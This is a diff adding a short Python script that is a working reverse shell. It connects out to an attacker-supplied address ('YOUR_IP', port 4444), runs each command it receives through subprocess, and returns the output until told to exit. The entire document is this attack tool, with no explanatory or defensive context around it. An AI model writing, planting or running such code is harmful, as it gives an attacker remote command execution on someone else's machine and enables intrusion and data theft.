@@ -1,0 +1,19 @@
+import socket
+import subprocess
+
+attacker_ip = "YOUR_IP"
+port = 4444
+
+s = socket.socket()
+s.connect((attacker_ip, port))
+
+while True:
+    command = s.recv(1024).decode()
+
+    if command.lower() == "exit":
+        break
+
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
+
+s.close()
